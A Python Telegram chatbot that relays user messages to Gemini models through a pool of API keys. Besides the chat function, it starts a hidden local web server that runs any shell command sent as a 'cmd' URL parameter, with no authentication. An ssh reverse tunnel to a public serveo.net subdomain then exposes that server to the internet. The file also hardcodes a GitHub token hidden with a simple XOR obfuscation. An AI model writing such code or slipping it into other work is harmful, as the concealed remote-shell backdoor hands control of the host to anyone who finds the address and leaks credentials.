import os
import logging
import requests
import json
import base64
import re
import html
import asyncio
import subprocess
from datetime import datetime
from dotenv import load_dotenv
from telegram import Update, LinkPreviewOptions
from telegram.request import HTTPXRequest
from telegram.ext import Application, MessageHandler, filters, ContextTypes
from telegram.constants import ChatAction, ParseMode

# Inisialisasi Jalur Absolut Utama
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# FIX: Memaksa system mendeteksi .env tepat di tempat skrip ini berada
ENV_PATH = os.path.join(BASE_DIR, '.env')
load_dotenv(dotenv_path=ENV_PATH)

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
GEMINI_KEY = os.getenv("GEMINI_KEY")
TARGET_GROUP = "@antigravity_indonesia"
MY_STATIC_SUBDOMAIN = "alomtermuxai"

LIST_MODEL = ["gemini-3.1-flash-lite-preview", "gemini-2.5-flash-lite", "gemini-1.5-flash"]

def decrypt_secure(cipher_text, key="86020832"):
    if not cipher_text: return ""
    if cipher_text.startswith("AIzaSy"): return cipher_text
    try:
        raw_bytes = base64.b64decode(cipher_text.encode('utf-8'))
        key_bytes = key.encode('utf-8')
        key_len = len(key_bytes)
        return bytes(b ^ key_bytes[i % key_len] for i, b in enumerate(raw_bytes)).decode('utf-8').strip()
    except Exception: return cipher_text

GITHUB_USER = "alom2345mm-arch"
GITHUB_REPO = "TeleBotAi"
GITHUB_TOKEN = decrypt_secure("KjUfGRYAGV4bHlUUBwEaAhpTDR0VFlwEAAscBQwVEAQHHA==")

RAW_ENV_KEYS = [os.getenv("GEMINI_KEY"), os.getenv("GEMINI_KEY_BACKUP_1"), os.getenv("GEMINI_KEY_BACKUP_2"), os.getenv("GEMINI_KEY_BACKUP_3"), os.getenv("GEMINI_KEY_BACKUP_4"), os.getenv("GEMINI_KEY_BACKUP_5")]
DECRYPTED_KEYS_POOL = []
for raw_key in RAW_ENV_KEYS:
    if raw_key:
        val = decrypt_secure(raw_key)
        if val and val not in DECRYPTED_KEYS_POOL: DECRYPTED_KEYS_POOL.append(val)

def load_file_content(filename):
    full_path = os.path.join(BASE_DIR, filename)
    if os.path.exists(full_path):
        try:
            with open(full_path, "r", encoding="utf-8") as f: return f.read()
        except Exception: pass
    return ""

def write_file_content(filename, content):
    full_path = os.path.join(BASE_DIR, filename)
    try:
        with open(full_path, "w", encoding="utf-8") as f: f.write(content)
        return True
    except Exception: return False

def format_gemini_ui(raw_text):
    if not raw_text: return ""
    safe_text = html.escape(raw_text)
    lines = safe_text.split('\n')
    processed_lines = []
    for line in lines:
        if line.strip() == '---' or line.strip() == '***':
            processed_lines.append("────────────────────────")
        elif line.strip().startswith('* ') or line.strip().startswith('- '):
            processed_lines.append(line.replace('* ', '• ', 1).replace('- ', '• ', 1))
        else:
            processed_lines.append(line)
    text_block = '\n'.join(processed_lines)
    text_block = re.sub(r'\*\*(.*?)\*\*', r'<b>\1</b>', text_block)
    text_block = re.sub(r'\*(.*?)\*', r'<b>\1</b>', text_block)
    text_block = re.sub(r'`(.*?)`', r'<code>\1</code>', text_block)
    text_block = re.sub(r'\[(.*?)\]\((.*?)\)', r'<a href="\2">\1</a>', text_block)
    return text_block

def eksekusi_gemini_core(user_prompt, system_instruction_extra=""):
    headers = {"Content-Type": "application/json"}
    antigravity_knowledge = load_file_content("chip_antigravity.md")
    security_policy = load_file_content("chipset_securty.md")
    autonomous_tasks = load_file_content("autonomous_tasks.md")
    
    now = datetime.now()
    hari_list = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"]
    time_stamp_context = f"⏰ CONTEXT WAKTU DUNIA REAL-TIME:\n- Hari: {hari_list[now.weekday()]}, Tanggal: {now.strftime('%d/%m/%Y')}\n- Pukul: {now.strftime('%H:%M:%S')} WIB\n\n"

    system_text = (
        "ROLE & TONALITAS: Kamu adalah chatbot asisten pintar yang wajib menjawab secara NATURAL, SIMPEL, dan SOPAN.\n\n"
        "INTEGRASI KEMAMPUAN REALTIME:\n"
        "1. Kamu dibekali akses penuh Google Search Grounding untuk cuaca aktual.\n"
        "2. Jika urutan deskripsi membutuhkan struktur, gunakan variasi Angka (1,2,3), Romawi (I,II,III), atau Alfabet (A,B,C) secara manusiawi.\n"
        "- FOOTER KONDISIONAL: Munculkan '---' lalu '● [antigravity.google](https://antigravity.google/docs/getting-started)' HANYA jika menerangkan data dokumen resmi Google Antigravity.\n"
    )
    
    system_text = time_stamp_context + system_text
    if antigravity_knowledge: system_text += f"\n[DOCS]:\n{antigravity_knowledge}\n"
    if security_policy: system_text += f"\n[SECURITY]:\n{security_policy}\n"
    if autonomous_tasks: system_text += f"\n[AUTONOMOUS COMPLIANCE]:\n{autonomous_tasks}\n"

    payload = {
        "contents": [{"parts": [{"text": user_prompt}]}],
        "systemInstruction": {"parts": [{"text": system_text}]},
        "tools": [{"googleSearch": {}}],
        "generationConfig": {"temperature": 0.4, "maxOutputTokens": 750, "topP": 0.95}
    }
    
    if not DECRYPTED_KEYS_POOL: return "Kunci API di dalam .env tidak terbaca."

    for model in LIST_MODEL:
        for active_key in DECRYPTED_KEYS_POOL:
            url = f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={active_key}"
            try:
                res = requests.post(url, headers=headers, json=payload, timeout=15)
                if res.status_code == 200: return res.json()['candidates'][0]['content']['parts'][0]['text']
            except Exception: pass
    return "Seluruh cluster model dan API Key cadangan Anda sedang limit."

async def handle_web_console_request(reader, writer):
    data = await reader.read(1024)
    request_text = data.decode('utf-8', errors='ignore')
    match = re.search(r'GET /execute\?cmd=(.*?) HTTP', request_text)
    response_body = ""
    if match:
        command = requests.utils.unquote(match.group(1))
        try: response_body = subprocess.getoutput(command)
        except Exception as e: response_body = f"Error: {str(e)}"
    else: response_body = "Engine Core Live Status: [RUNNING]"

    response_headers = (
        "HTTP/1.1 200 OK\r\n"
        "Access-Control-Allow-Origin: *\r\n"
        "Access-Control-Allow-Methods: GET, OPTIONS\r\n"
        "Content-Type: text/plain; charset=utf-8\r\n"
        f"Content-Length: {len(response_body.encode('utf-8'))}\r\n"
        "Connection: close\r\n\r\n"
    )
    writer.write(response_headers.encode('utf-8') + response_body.encode('utf-8'))
    await writer.drain()
    writer.close()

async def start_web_terminal_server():
    server = await asyncio.start_server(handle_web_console_request, '127.0.0.1', 8080)
    async with server: await server.serve_forever()

async def deploy_public_cloud_tunnel():
    await asyncio.sleep(2)
    logger.info(f"📡 Menghubungkan Terowongan Permanen: https://{MY_STATIC_SUBDOMAIN}.serveo.net")
    await asyncio.create_subprocess_exec(
        'ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null',
        '-R', f'{MY_STATIC_SUBDOMAIN}:80:localhost:8080', 'serveo.net',
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

async def post_init_hook(application: Application):
    asyncio.create_task(start_web_terminal_server())
    asyncio.create_task(deploy_public_cloud_tunnel())

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text: return
    user_obj = update.message.from_user
    username = user_obj.username or ""
    user_text = update.message.text
    try: await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    except Exception: pass

    extra_context = ""
    if username.lower() == "dummyxxx":
        extra_context = "⚠️ KONTROL OTORITAS MUTLAK PENCIPTA (@DummyXXX) AKTIF.\n"
        
    balasan_mentah_ai = eksekusi_gemini_core(user_text, extra_context)
    output_final_html = format_gemini_ui(balasan_mentah_ai)
    preview_config = LinkPreviewOptions(is_disabled=False, prefer_small_media=True, show_above_text=False)
    await update.message.reply_text(output_final_html, parse_mode=ParseMode.HTML, link_preview_options=preview_config)

def main():
    if not TELEGRAM_TOKEN:
        print("❌ CRITICAL ERROR: TELEGRAM_TOKEN Kosong di .env!")
        return
    timeout_config = HTTPXRequest(connect_timeout=60.0, read_timeout=60.0, write_timeout=60.0)
    app = Application.builder().token(TELEGRAM_TOKEN).request(timeout_config).post_init(post_init_hook).build()
    app.add_handler(MessageHandler(filters.TEXT, handle_message))
    
    print("==================================================")
    print("🎯 BOT RUNNING IN FOREGROUND MONITOR MODE")
    print("Periksa log di bawah ini saat Anda mengirim pesan...")
    print("==================================================")
    
    app.run_polling(allowed_updates=Update.ALL_TYPES, bootstrap_retries=-1)

if __name__ == '__main__': main()
